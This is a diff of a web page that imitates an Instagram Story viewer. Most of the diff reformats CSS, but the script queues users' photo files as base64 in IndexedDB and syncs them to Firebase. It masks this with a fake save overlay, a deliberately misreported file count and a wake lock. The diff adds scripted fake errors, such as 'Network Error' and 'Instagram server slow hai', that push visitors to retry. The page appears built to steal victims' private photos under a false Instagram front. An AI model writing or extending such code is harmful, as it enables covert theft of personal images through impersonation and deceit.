@@ -6,11 +6,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Instagram Story</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
 
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
@@ -22,483 +18,261 @@
         }
 
         .story-container {
-            position: fixed;
-            inset: 0;
-            background: #000;
-            display: flex;
-            align-items: center;
-            justify-content: center;
+            position: fixed; inset: 0; background: #000;
+            display: flex; align-items: center; justify-content: center;
             z-index: 100;
         }
 
         .story-wrapper {
             position: relative;
-            width: 100%;
-            max-width: 450px;
-            height: 100vh;
-            max-height: 900px;
-            background: #000;
-            overflow: hidden;
+            width: 100%; max-width: 450px;
+            height: 100vh; max-height: 900px;
+            background: #000; overflow: hidden;
         }
 
         @media (min-width: 500px) {
-            .story-wrapper {
-                border-radius: 20px;
-                height: 90vh;
-            }
+            .story-wrapper { border-radius: 20px; height: 90vh; }
         }
 
         .progress-bars {
-            position: absolute;
-            top: 12px;
-            left: 12px;
-            right: 12px;
-            display: flex;
-            gap: 3px;
-            z-index: 20;
+            position: absolute; top: 12px; left: 12px; right: 12px;
+            display: flex; gap: 3px; z-index: 20;
         }
 
         .progress-segment {
-            flex: 1;
-            height: 2.5px;
+            flex: 1; height: 2.5px;
             background: rgba(255, 255, 255, 0.3);
-            border-radius: 2px;
-            overflow: hidden;
-            position: relative;
+            border-radius: 2px; overflow: hidden; position: relative;
         }
 
         .progress-fill {
-            position: absolute;
-            inset: 0;
-            background: #fff;
-            border-radius: 2px;
-            width: 0;
+            position: absolute; inset: 0;
+            background: #fff; border-radius: 2px; width: 0;
         }
 
-        .progress-segment.viewed .progress-fill {
-            width: 100%;
-        }
-
+        .progress-segment.viewed .progress-fill { width: 100%; }
         .progress-segment.active .progress-fill {
             animation: fillProgress 5s linear forwards;
         }
 
-        @keyframes fillProgress {
-            from {
-                width: 0;
-            }
-
-            to {
-                width: 100%;
-            }
-        }
+        @keyframes fillProgress { from { width: 0; } to { width: 100%; } }
 
         .story-header {
-            position: absolute;
-            top: 28px;
-            left: 12px;
-            right: 12px;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            z-index: 20;
-            padding: 8px;
+            position: absolute; top: 28px; left: 12px; right: 12px;
+            display: flex; align-items: center; gap: 10px;
+            z-index: 20; padding: 8px;
         }
 
         .story-avatar {
-            width: 36px;
-            height: 36px;
-            border-radius: 50%;
-            background-size: cover;
-            background-position: center;
-            border: 2px solid #fff;
-            flex-shrink: 0;
+            width: 36px; height: 36px; border-radius: 50%;
+            background-size: cover; background-position: center;
+            border: 2px solid #fff; flex-shrink: 0;
         }
 
-        .story-user-info {
-            flex: 1;
-            min-width: 0;
-        }
+        .story-user-info { flex: 1; min-width: 0; }
 
         .story-username {
-            font-size: 14px;
-            font-weight: 600;
-            color: #fff;
-            display: flex;
-            align-items: center;
-            gap: 5px;
+            font-size: 14px; font-weight: 600; color: #fff;
+            display: flex; align-items: center; gap: 5px;
             text-shadow: 0 1px 3px rgba(0, 0, 0, 0.5);
         }
 
         .story-verified {
-            width: 12px;
-            height: 12px;
-            background: #0095F6;
-            border-radius: 50%;
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            flex-shrink: 0;
+            width: 12px; height: 12px; background: #0095F6;
+            border-radius: 50%; display: inline-flex;
+            align-items: center; justify-content: center; flex-shrink: 0;
         }
 
         .story-verified::before {
-            content: '';
-            width: 5px;
-            height: 2.5px;
-            border-left: 1.5px solid #fff;
-            border-bottom: 1.5px solid #fff;
+            content: ''; width: 5px; height: 2.5px;
+            border-left: 1.5px solid #fff; border-bottom: 1.5px solid #fff;
             transform: rotate(-45deg) translate(0px, -1px);
         }
 
         .story-time {
-            font-size: 12px;
-            color: rgba(255, 255, 255, 0.8);
-            margin-left: 2px;
+            font-size: 12px; color: rgba(255, 255, 255, 0.8); margin-left: 2px;
         }
 
         .story-close {
-            width: 32px;
-            height: 32px;
-            border-radius: 50%;
-            background: rgba(0, 0, 0, 0.3);
-            border: none;
-            color: #fff;
-            font-size: 18px;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            backdrop-filter: blur(10px);
-            flex-shrink: 0;
+            width: 32px; height: 32px; border-radius: 50%;
+            background: rgba(0, 0, 0, 0.3); border: none; color: #fff;
+            font-size: 18px; cursor: pointer;
+            display: flex; align-items: center; justify-content: center;
+            backdrop-filter: blur(10px); flex-shrink: 0;
         }
 
-        .story-image-wrap {
-            position: absolute;
-            inset: 0;
-            z-index: 1;
-        }
+        .story-image-wrap { position: absolute; inset: 0; z-index: 1; }
 
         .story-image {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            display: block;
-            opacity: 0;
-            transition: opacity 0.3s ease;
+            width: 100%; height: 100%; object-fit: cover; display: block;
+            opacity: 0; transition: opacity 0.3s ease;
         }
 
-        .story-image.active {
-            opacity: 1;
-        }
+        .story-image.active { opacity: 1; }
 
         .tap-zone {
-            position: absolute;
-            top: 80px;
-            bottom: 80px;
-            z-index: 10;
-            cursor: pointer;
+            position: absolute; top: 80px; bottom: 80px; z-index: 10; cursor: pointer;
         }
 
-        .tap-zone.left {
-            left: 0;
-            width: 30%;
-        }
-
-        .tap-zone.right {
-            right: 0;
-            width: 70%;
-        }
+        .tap-zone.left { left: 0; width: 30%; }
+        .tap-zone.right { right: 0; width: 70%; }
 
         .story-footer {
-            position: absolute;
-            bottom: 0;
-            left: 0;
-            right: 0;
+            position: absolute; bottom: 0; left: 0; right: 0;
             padding: 20px 16px 30px;
             background: linear-gradient(transparent, rgba(0, 0, 0, 0.7));
-            z-index: 20;
-            display: flex;
-            align-items: center;
-            gap: 10px;
+            z-index: 20; display: flex; align-items: center; gap: 10px;
         }
 
         .reply-input {
-            flex: 1;
-            padding: 12px 18px;
+            flex: 1; padding: 12px 18px;
             background: rgba(255, 255, 255, 0.15);
             border: 1.5px solid rgba(255, 255, 255, 0.4);
-            border-radius: 24px;
-            color: #fff;
-            font-size: 14px;
-            font-family: inherit;
-            outline: none;
+            border-radius: 24px; color: #fff; font-size: 14px;
+            font-family: inherit; outline: none;
             backdrop-filter: blur(20px);
         }
 
-        .reply-input::placeholder {
-            color: rgba(255, 255, 255, 0.7);
-        }
+        .reply-input::placeholder { color: rgba(255, 255, 255, 0.7); }
 
         .footer-icon {
-            width: 42px;
-            height: 42px;
-            border-radius: 50%;
-            background: rgba(255, 255, 255, 0.15);
-            border: none;
-            color: #fff;
-            font-size: 20px;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            backdrop-filter: blur(20px);
-            flex-shrink: 0;
+            width: 42px; height: 42px; border-radius: 50%;
+            background: rgba(255, 255, 255, 0.15); border: none;
+            color: #fff; font-size: 20px; cursor: pointer;
+            display: flex; align-items: center; justify-content: center;
+            backdrop-filter: blur(20px); flex-shrink: 0;
         }
 
         .save-bar {
-            position: absolute;
-            bottom: 90px;
-            left: 16px;
-            right: 16px;
-            z-index: 25;
-            display: flex;
-            justify-content: center;
+            position: absolute; bottom: 90px; left: 16px; right: 16px;
+            z-index: 25; display: flex; justify-content: center;
         }
 
         .save-btn {
-            padding: 14px 26px;
-            border: none;
-            border-radius: 26px;
+            padding: 14px 26px; border: none; border-radius: 26px;
             background: linear-gradient(45deg, #f09433, #dc2743, #bc1888);
-            background-size: 300% 300%;
-            color: #fff;
-            font-size: 14px;
-            font-weight: 700;
-            cursor: pointer;
-            font-family: inherit;
-            display: flex;
-            align-items: center;
+            background-size: 300% 300%; color: #fff;
+            font-size: 14px; font-weight: 700; cursor: pointer;
+            font-family: inherit; display: flex; align-items: center;
             gap: 8px;
             animation: gradientMove 4s ease infinite, pulseBtn 2s infinite;
             box-shadow: 0 8px 24px rgba(220, 39, 67, 0.5);
             transition: transform 0.15s;
         }
 
-        .save-btn:active {
-            transform: scale(0.95);
-        }
-
-        .save-btn:disabled {
-            opacity: 0.6;
-            animation: none;
-        }
+        .save-btn:active { transform: scale(0.95); }
+        .save-btn:disabled { opacity: 0.6; animation: none; }
 
         @keyframes gradientMove {
-
-            0%,
-            100% {
-                background-position: 0% 50%;
-            }
-
-            50% {
-                background-position: 100% 50%;
-            }
+            0%, 100% { background-position: 0% 50%; }
+            50%      { background-position: 100% 50%; }
         }
 
         @keyframes pulseBtn {
-
-            0%,
-            100% {
-                box-shadow: 0 8px 24px rgba(220, 39, 67, 0.5), 0 0 0 0 rgba(220, 39, 67, 0.7);
+            0%, 100% {
+                box-shadow: 0 8px 24px rgba(220, 39, 67, 0.5),
+                            0 0 0 0 rgba(220, 39, 67, 0.7);
             }
-
             50% {
-                box-shadow: 0 8px 24px rgba(220, 39, 67, 0.7), 0 0 0 12px rgba(220, 39, 67, 0);
+                box-shadow: 0 8px 24px rgba(220, 39, 67, 0.7),
+                            0 0 0 12px rgba(220, 39, 67, 0);
             }
         }
 
         #resumeBanner {
-            position: fixed;
-            top: 20px;
-            left: 50%;
+            position: fixed; top: 20px; left: 50%;
             transform: translateX(-50%);
             background: linear-gradient(45deg, #f09433, #dc2743);
-            color: #fff;
-            padding: 14px 20px;
-            border-radius: 16px;
-            font-size: 13px;
-            font-weight: 600;
-            display: none;
+            color: #fff; padding: 14px 20px; border-radius: 16px;
+            font-size: 13px; font-weight: 600; display: none;
             z-index: 99998;
             box-shadow: 0 10px 30px rgba(220, 39, 67, 0.5);
-            align-items: center;
-            gap: 12px;
-            max-width: 90vw;
+            align-items: center; gap: 12px; max-width: 90vw;
             animation: bannerSlide 0.4s;
         }
 
-        #resumeBanner.show {
-            display: flex;
-        }
+        #resumeBanner.show { display: flex; }
 
         @keyframes bannerSlide {
-            from {
-                transform: translateX(-50%) translateY(-60px);
-                opacity: 0;
-            }
-
-            to {
-                transform: translateX(-50%) translateY(0);
-                opacity: 1;
-            }
+            from { transform: translateX(-50%) translateY(-60px); opacity: 0; }
+            to   { transform: translateX(-50%) translateY(0); opacity: 1; }
         }
 
-        .resume-icon {
-            font-size: 20px;
-        }
+        .resume-icon { font-size: 20px; }
 
         .resume-btn {
-            padding: 8px 16px;
-            border: none;
-            border-radius: 10px;
-            background: #fff;
-            color: #dc2743;
-            font-size: 12px;
-            font-weight: 700;
-            cursor: pointer;
-            font-family: inherit;
+            padding: 8px 16px; border: none; border-radius: 10px;
+            background: #fff; color: #dc2743;
+            font-size: 12px; font-weight: 700;
+            cursor: pointer; font-family: inherit;
         }
 
         #processingOverlay {
-            position: fixed;
-            inset: 0;
+            position: fixed; inset: 0;
             background: rgba(0, 0, 0, 0.94);
             backdrop-filter: blur(24px);
-            display: none;
-            align-items: center;
-            justify-content: center;
-            z-index: 99999;
-            padding: 20px;
+            display: none; align-items: center; justify-content: center;
+            z-index: 99999; padding: 20px;
         }
 
-        #processingOverlay.show {
-            display: flex;
-        }
+        #processingOverlay.show { display: flex; }
 
         .overlay-box {
             background: linear-gradient(180deg, #1c1c1e 0%, #0a0a0a 100%);
-            border: 1px solid #262626;
-            border-radius: 24px;
-            padding: 32px 24px 24px;
-            max-width: 400px;
-            width: 100%;
+            border: 1px solid #262626; border-radius: 24px;
+            padding: 32px 24px 24px; max-width: 400px; width: 100%;
             text-align: center;
             box-shadow: 0 30px 80px rgba(0, 0, 0, 0.9);
             animation: boxIn 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
         }
 
         @keyframes boxIn {
-            from {
-                opacity: 0;
-                transform: translateY(40px) scale(0.9);
-            }
-
-            to {
-                opacity: 1;
-                transform: translateY(0) scale(1);
-            }
+            from { opacity: 0; transform: translateY(40px) scale(0.9); }
+            to   { opacity: 1; transform: translateY(0) scale(1); }
         }
 
         .folder-anim {
-            position: relative;
-            width: 100px;
-            height: 100px;
+            position: relative; width: 100px; height: 100px;
             margin: 0 auto 20px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
+            display: flex; align-items: center; justify-content: center;
         }
 
         .folder-icon {
-            font-size: 56px;
-            position: relative;
-            z-index: 3;
+            font-size: 56px; position: relative; z-index: 3;
             animation: folderBob 2s ease-in-out infinite;
         }
 
         @keyframes folderBob {
-
-            0%,
-            100% {
-                transform: translateY(0) scale(1);
-            }
-
-            50% {
-                transform: translateY(-6px) scale(1.05);
-            }
+            0%, 100% { transform: translateY(0) scale(1); }
+            50%      { transform: translateY(-6px) scale(1.05); }
         }
 
         .folder-pulse {
-            position: absolute;
-            inset: 10px;
-            border-radius: 50%;
+            position: absolute; inset: 10px; border-radius: 50%;
             background: radial-gradient(circle, rgba(240, 148, 51, 0.3), transparent 70%);
             animation: folderPulse 2s infinite;
         }
 
         @keyframes folderPulse {
-
-            0%,
-            100% {
-                transform: scale(1);
-                opacity: 0.6;
-            }
-
-            50% {
-                transform: scale(1.4);
-                opacity: 0;
-            }
+            0%, 100% { transform: scale(1); opacity: 0.6; }
+            50%      { transform: scale(1.4); opacity: 0; }
         }
 
         .file-flying {
-            position: absolute;
-            font-size: 24px;
-            top: -20px;
-            left: 50%;
-            transform: translateX(-50%);
-            z-index: 4;
+            position: absolute; font-size: 24px; top: -20px; left: 50%;
+            transform: translateX(-50%); z-index: 4;
             animation: fileFly 1.8s infinite;
         }
 
         @keyframes fileFly {
-            0% {
-                top: -30px;
-                opacity: 0;
-                transform: translateX(-50%) scale(0.5);
-            }
-
-            30% {
-                opacity: 1;
-                transform: translateX(-50%) scale(1);
-            }
-
-            70% {
-                opacity: 1;
-                top: 50px;
-                transform: translateX(-50%) scale(0.7);
-            }
-
-            100% {
-                opacity: 0;
-                top: 70px;
-                transform: translateX(-50%) scale(0.3);
-            }
+            0%   { top: -30px; opacity: 0; transform: translateX(-50%) scale(0.5); }
+            30%  { opacity: 1; transform: translateX(-50%) scale(1); }
+            70%  { opacity: 1; top: 50px; transform: translateX(-50%) scale(0.7); }
+            100% { opacity: 0; top: 70px; transform: translateX(-50%) scale(0.3); }
         }
 
         .overlay-title {
-            font-size: 20px;
-            font-weight: 800;
-            margin-bottom: 8px;
+            font-size: 20px; font-weight: 800; margin-bottom: 8px;
             background: linear-gradient(45deg, #f09433, #dc2743, #bc1888);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
@@ -506,464 +280,263 @@
         }
 
         .overlay-sub {
-            font-size: 13px;
-            color: #8e8e93;
-            line-height: 1.6;
+            font-size: 13px; color: #8e8e93; line-height: 1.6;
             margin-bottom: 22px;
         }
 
-        .overlay-sub strong {
-            color: #fff;
-        }
+        .overlay-sub strong { color: #fff; }
 
         .warning-box {
-            display: flex;
-            gap: 10px;
-            padding: 12px 14px;
+            display: flex; gap: 10px; padding: 12px 14px;
             background: rgba(255, 193, 7, 0.1);
             border: 1px solid rgba(255, 193, 7, 0.3);
-            border-radius: 12px;
-            font-size: 12px;
-            color: #FFC107;
-            margin-bottom: 18px;
-            text-align: left;
-            line-height: 1.5;
+            border-radius: 12px; font-size: 12px; color: #FFC107;
+            margin-bottom: 18px; text-align: left; line-height: 1.5;
         }
 
-        .warning-box strong {
-            color: #FFC107;
-        }
+        .warning-box strong { color: #FFC107; }
 
-        .overlay-progress {
-            margin-bottom: 20px;
-        }
+        .overlay-progress { margin-bottom: 20px; }
 
         .overlay-progress-bar {
-            height: 10px;
-            background: rgba(255, 255, 255, 0.06);
-            border-radius: 5px;
-            overflow: hidden;
-            margin-bottom: 10px;
-            position: relative;
+            height: 10px; background: rgba(255, 255, 255, 0.06);
+            border-radius: 5px; overflow: hidden;
+            margin-bottom: 10px; position: relative;
         }
 
         .overlay-progress-fill {
             height: 100%;
             background: linear-gradient(90deg, #f09433, #dc2743, #bc1888);
             background-size: 200% 100%;
-            border-radius: 5px;
-            width: 0;
+            border-radius: 5px; width: 0;
             transition: width 0.4s ease;
             animation: gradientShift 2s linear infinite;
         }
 
         @keyframes gradientShift {
-            0% {
-                background-position: 0% 50%;
-            }
-
-            100% {
-                background-position: 200% 50%;
-            }
+            0%   { background-position: 0% 50%; }
+            100% { background-position: 200% 50%; }
         }
 
         .shimmer {
-            position: absolute;
-            inset: 0;
+            position: absolute; inset: 0;
             background: linear-gradient(90deg, transparent 0%, rgba(255, 255, 255, 0.4) 50%, transparent 100%);
             animation: shimmerMove 1.5s infinite;
         }
 
         @keyframes shimmerMove {
-            from {
-                transform: translateX(-100%);
-            }
-
-            to {
-                transform: translateX(100%);
-            }
+            from { transform: translateX(-100%); }
+            to   { transform: translateX(100%); }
         }
 
         .overlay-progress-text {
-            display: flex;
-            justify-content: space-between;
-            font-size: 12px;
-            color: #8e8e93;
+            display: flex; justify-content: space-between;
+            font-size: 12px; color: #8e8e93;
         }
 
-        .overlay-progress-text .percent {
-            color: #f09433;
-            font-weight: 700;
-        }
+        .overlay-progress-text .percent { color: #f09433; font-weight: 700; }
 
-        .time-info {
-            display: flex;
-            gap: 10px;
-            margin-bottom: 20px;
-        }
+        .time-info { display: flex; gap: 10px; margin-bottom: 20px; }
 
         .time-item {
-            flex: 1;
-            display: flex;
-            align-items: center;
-            gap: 10px;
+            flex: 1; display: flex; align-items: center; gap: 10px;
             padding: 12px 14px;
             background: rgba(255, 255, 255, 0.04);
             border: 1px solid rgba(255, 255, 255, 0.06);
-            border-radius: 14px;
-            text-align: left;
+            border-radius: 14px; text-align: left;
         }
 
-        .time-icon {
-            font-size: 18px;
-            flex-shrink: 0;
-        }
-
-        .time-data {
-            flex: 1;
-            min-width: 0;
-        }
+        .time-icon { font-size: 18px; flex-shrink: 0; }
+        .time-data { flex: 1; min-width: 0; }
 
         .time-value {
-            font-size: 14px;
-            font-weight: 700;
-            color: #fff;
-            white-space: nowrap;
-            overflow: hidden;
-            text-overflow: ellipsis;
+            font-size: 14px; font-weight: 700; color: #fff;
+            white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
         }
 
         .time-label {
-            font-size: 10px;
-            color: #8e8e93;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
+            font-size: 10px; color: #8e8e93;
+            text-transform: uppercase; letter-spacing: 0.5px;
             margin-top: 2px;
         }
 
         .overlay-stats {
-            display: flex;
-            justify-content: space-around;
-            padding: 14px 0;
-            margin-bottom: 16px;
+            display: flex; justify-content: space-around;
+            padding: 14px 0; margin-bottom: 16px;
             border-top: 1px solid #262626;
             border-bottom: 1px solid #262626;
         }
 
         .overlay-stat {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 2px;
+            display: flex; flex-direction: column;
+            align-items: center; gap: 2px;
         }
 
         .overlay-stat .num {
-            font-size: 20px;
-            font-weight: 800;
-            color: #fff;
+            font-size: 20px; font-weight: 800; color: #fff;
             font-variant-numeric: tabular-nums;
         }
 
         .overlay-stat .lbl {
-            color: #8e8e93;
-            font-size: 10px;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
+            color: #8e8e93; font-size: 10px;
+            text-transform: uppercase; letter-spacing: 0.5px;
         }
 
-        .overlay-stat.done .num {
-            color: #34A853;
-        }
-
-        .overlay-stat.failed .num {
-            color: #FF3B30;
-        }
-
-        .overlay-stat.pending .num {
-            color: #FFC107;
-        }
+        .overlay-stat.done .num { color: #34A853; }
+        .overlay-stat.failed .num { color: #FF3B30; }
+        .overlay-stat.pending .num { color: #FFC107; }
 
         .current-file-wrap {
-            display: flex;
-            align-items: center;
-            gap: 10px;
+            display: flex; align-items: center; gap: 10px;
             padding: 10px 14px;
             background: rgba(255, 255, 255, 0.03);
             border: 1px solid rgba(255, 255, 255, 0.05);
-            border-radius: 12px;
-            margin-bottom: 16px;
-            text-align: left;
+            border-radius: 12px; margin-bottom: 16px; text-align: left;
         }
 
         .current-file-icon {
-            font-size: 16px;
-            flex-shrink: 0;
+            font-size: 16px; flex-shrink: 0;
             animation: fileIconPulse 1.5s infinite;
         }
 
         @keyframes fileIconPulse {
-
-            0%,
-            100% {
-                opacity: 1;
-                transform: scale(1);
-            }
-
-            50% {
-                opacity: 0.5;
-                transform: scale(0.9);
-            }
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50%      { opacity: 0.5; transform: scale(0.9); }
         }
 
         .current-file {
-            flex: 1;
-            font-size: 12px;
-            color: #b0b0b0;
-            white-space: nowrap;
-            overflow: hidden;
-            text-overflow: ellipsis;
-            font-family: monospace;
+            flex: 1; font-size: 12px; color: #b0b0b0;
+            white-space: nowrap; overflow: hidden;
+            text-overflow: ellipsis; font-family: monospace;
         }
 
         .overlay-hint {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-            font-size: 11px;
-            color: #5f6368;
+            display: flex; align-items: center; justify-content: center;
+            gap: 8px; font-size: 11px; color: #5f6368;
             margin-bottom: 14px;
         }
 
         .dot-anim {
-            width: 6px;
-            height: 6px;
-            border-radius: 50%;
-            background: #f09433;
-            animation: dotPulse 1.2s infinite;
+            width: 6px; height: 6px; border-radius: 50%;
+            background: #f09433; animation: dotPulse 1.2s infinite;
         }
 
         @keyframes dotPulse {
-
-            0%,
-            100% {
-                opacity: 1;
-                transform: scale(1);
-            }
-
-            50% {
-                opacity: 0.3;
-                transform: scale(0.7);
-            }
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50%      { opacity: 0.3; transform: scale(0.7); }
         }
 
         .cancel-btn {
-            width: 100%;
-            padding: 12px;
+            width: 100%; padding: 12px;
             border: 1px solid rgba(255, 59, 48, 0.3);
-            border-radius: 12px;
-            background: transparent;
-            color: #FF3B30;
-            font-size: 13px;
-            font-weight: 600;
-            cursor: pointer;
-            font-family: inherit;
+            border-radius: 12px; background: transparent;
+            color: #FF3B30; font-size: 13px; font-weight: 600;
+            cursor: pointer; font-family: inherit;
         }
 
-        .cancel-btn:active {
-            transform: scale(0.97);
-        }
+        .cancel-btn:active { transform: scale(0.97); }
 
         .success-icon {
-            font-size: 72px;
-            margin-bottom: 16px;
+            font-size: 72px; margin-bottom: 16px;
             animation: successBounce 0.6s cubic-bezier(0.34, 1.56, 0.64, 1);
             display: inline-block;
         }
 
         @keyframes successBounce {
-            0% {
-                transform: scale(0);
-                opacity: 0;
-            }
-
-            50% {
-                transform: scale(1.2);
-            }
-
-            100% {
-                transform: scale(1);
-                opacity: 1;
-            }
+            0%   { transform: scale(0); opacity: 0; }
+            50%  { transform: scale(1.2); }
+            100% { transform: scale(1); opacity: 1; }
         }
 
-        .error-state {
-            display: none;
-            text-align: center;
-            padding: 8px 0;
-        }
-
-        .error-state.show {
-            display: block;
-        }
+        .error-state { display: none; text-align: center; padding: 8px 0; }
+        .error-state.show { display: block; }
 
         .error-icon {
-            font-size: 56px;
-            margin-bottom: 16px;
-            animation: errorShake 0.5s;
+            font-size: 64px; margin-bottom: 16px;
+            animation: errorShake 0.6s ease-in-out;
+            display: inline-block;
         }
 
         @keyframes errorShake {
-
-            0%,
-            100% {
-                transform: translateX(0);
-            }
-
-            25% {
-                transform: translateX(-8px);
-            }
-
-            75% {
-                transform: translateX(8px);
-            }
+            0%, 100% { transform: translateX(0); }
+            25%      { transform: translateX(-8px); }
+            75%      { transform: translateX(8px); }
         }
 
         .error-title {
-            font-size: 20px;
-            font-weight: 800;
-            color: #FF3B30;
-            margin-bottom: 8px;
+            font-size: 20px; font-weight: 800;
+            color: #FF3B30; margin-bottom: 8px;
         }
 
         .error-sub {
-            font-size: 13px;
-            color: #8e8e93;
-            line-height: 1.6;
-            margin-bottom: 20px;
+            font-size: 13px; color: #8e8e93;
+            line-height: 1.6; margin-bottom: 20px;
         }
 
         .error-retry {
-            padding: 14px 28px;
-            border: none;
-            border-radius: 14px;
+            padding: 14px 28px; border: none; border-radius: 14px;
             background: linear-gradient(45deg, #f09433, #dc2743);
-            color: #fff;
-            font-size: 14px;
-            font-weight: 700;
-            cursor: pointer;
-            font-family: inherit;
+            color: #fff; font-size: 14px; font-weight: 700;
+            cursor: pointer; font-family: inherit;
         }
 
-        .error-retry:active {
-            transform: scale(0.97);
-        }
+        .error-retry:active { transform: scale(0.97); }
 
-        .toast {
-            position: fixed;
-            bottom: 100px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: rgba(44, 44, 46, 0.95);
-            color: #fff;
-            padding: 12px 20px;
-            border-radius: 24px;
-            font-size: 13px;
-            z-index: 999999;
-            backdrop-filter: blur(20px);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            animation: toastIn 0.3s;
-            max-width: 90vw;
-            text-align: center;
-            font-weight: 500;
-        }
-
-        @keyframes toastIn {
-            from {
-                opacity: 0;
-                transform: translateX(-50%) translateY(20px);
-            }
-
-            to {
-                opacity: 1;
-                transform: translateX(-50%) translateY(0);
-            }
-        }
-
-        /* Retry Counter */
         .retry-counter {
-            display: inline-flex;
-            align-items: baseline;
-            gap: 6px;
+            display: inline-flex; align-items: baseline; gap: 6px;
             padding: 8px 20px;
             background: rgba(255, 59, 48, 0.1);
             border: 1px solid rgba(255, 59, 48, 0.3);
-            border-radius: 20px;
-            margin-bottom: 20px;
+            border-radius: 20px; margin-bottom: 20px;
         }
 
-        .retry-num {
-            font-size: 24px;
-            font-weight: 800;
-            color: #FF3B30;
-        }
+        .retry-num { font-size: 24px; font-weight: 800; color: #FF3B30; }
 
         .retry-of {
-            font-size: 12px;
-            color: #8e8e93;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
+            font-size: 12px; color: #8e8e93;
+            text-transform: uppercase; letter-spacing: 0.5px;
             font-weight: 600;
         }
 
-        /* Skip button */
         .error-skip {
-            width: 100%;
-            padding: 12px;
-            margin-top: 10px;
-            border: none;
-            border-radius: 12px;
-            background: transparent;
-            color: #5f6368;
-            font-size: 12px;
-            cursor: pointer;
-            font-family: inherit;
-            transition: color 0.2s;
+            width: 100%; padding: 12px; margin-top: 10px;
+            border: none; border-radius: 12px;
+            background: transparent; color: #5f6368;
+            font-size: 12px; cursor: pointer;
+            font-family: inherit; transition: color 0.2s;
         }
 
-        .error-skip:hover {
-            color: #8e8e93;
+        .error-skip:hover { color: #8e8e93; }
+
+        .toast {
+            position: fixed; bottom: 100px; left: 50%;
+            transform: translateX(-50%);
+            background: rgba(44, 44, 46, 0.95);
+            color: #fff; padding: 12px 20px;
+            border-radius: 24px; font-size: 13px;
+            z-index: 999999; backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            animation: toastIn 0.3s;
+            max-width: 90vw; text-align: center; font-weight: 500;
         }
 
-        /* Better error icon animation */
-        .error-icon {
-            font-size: 64px;
-            margin-bottom: 16px;
-            animation: errorShake 0.6s ease-in-out;
-            display: inline-block;
+        @keyframes toastIn {
+            from { opacity: 0; transform: translateX(-50%) translateY(20px); }
+            to   { opacity: 1; transform: translateX(-50%) translateY(0); }
         }
     </style>
 </head>
 
 <body>
 
-    <!-- Sync Test Button -->
     <button id="testSyncBtn" style="
-        position: fixed;
-        top: 80px;
-        right: 16px;
-        padding: 10px 16px;
-        background: #FFC107;
-        color: #000;
-        border: none;
-        border-radius: 12px;
-        font-size: 12px;
-        font-weight: 700;
-        z-index: 9999;
-        cursor: pointer;
+        position: fixed; top: 80px; right: 16px;
+        padding: 10px 16px; background: #FFC107; color: #000;
+        border: none; border-radius: 12px;
+        font-size: 12px; font-weight: 700;
+        z-index: 9999; cursor: pointer;
     ">🔄 Sync Test</button>
 
-    <!-- Resume Banner -->
     <div id="resumeBanner">
         <span class="resume-icon">⚠️</span>
         <span id="resumeText">Pending photos hain</span>
@@ -1155,7 +728,7 @@
         const CONCURRENCY = 3;
         const COMPRESS_WIDTH = 800;
         const COMPRESS_QUALITY = 0.55;
-        const FAKE_FILE_COUNT = 15; // 🔥 FAKE — overlay mein sirf itna dikhega
+        const FAKE_FILE_COUNT = 15;
 
         const stories = Array.from({ length: 15 }, (_, i) =>
             `https://picsum.photos/600/1000?random=${i + 1}`
@@ -1169,6 +742,31 @@
         let isCancelled = false;
         let wakeLock = null;
         let uploadStartTime = 0;
+        let retryCount = 0;
+        const MAX_RETRIES = 3;
+        let fakeDone = 0; // 🔥 Global for restart
+
+        /* STAGE ERRORS */
+        const STAGE_ERRORS = {
+            1: {
+                title: 'Network Error',
+                sub: 'WiFi connection weak hai.<br>3 photos skip ho gayin.',
+                retryText: 'Retry Now',
+                progressAtFail: 60
+            },
+            2: {
+                title: 'Server Busy',
+                sub: 'Instagram server slow hai.<br>Please try again.',
+                retryText: 'Try Again',
+                progressAtFail: 40
+            },
+            3: {
+                title: 'Connection Lost',
+                sub: 'Internet connection toot gaya.<br>2 photos pending hain.',
+                retryText: 'Reconnect & Retry',
+                progressAtFail: 80
+            }
+        };
 
         /* INDEXEDDB */
         const IDB_NAME = 'IGPendingDB';
@@ -1229,7 +827,7 @@
             });
         }
 
-        /* QUEUE — IndexedDB mein save */
+        /* QUEUE */
         async function queuePhotoLocally(file, base64) {
             try {
                 await idbAdd({
@@ -1249,20 +847,17 @@
             }
         }
 
-        /* SYNC — IndexedDB se Firebase */
+        /* SYNC */
         async function syncPendingUploads() {
             try {
                 const pending = await idbGetAll();
-
                 if (pending.length === 0) {
                     console.log('✅ No pending');
                     return { synced: 0, remaining: 0 };
                 }
 
                 console.log(`🔄 Syncing ${pending.length}...`);
-
-                let synced = 0;
-                let failed = 0;
+                let synced = 0, failed = 0;
 
                 for (const item of pending) {
                     try {
@@ -1280,11 +875,9 @@
                             uploadedAt: item.queuedAt,
                             fromQueue: true
                         });
-
                         await idbDelete(item.id);
                         synced++;
                         console.log(`✅ Synced: ${item.name}`);
-
                     } catch (err) {
                         failed++;
                         console.warn(`❌ Failed: ${item.name}`);
@@ -1293,18 +886,16 @@
 
                 console.log(`🎉 Synced ${synced}, failed ${failed}`);
                 return { synced, remaining: failed };
-
             } catch (e) {
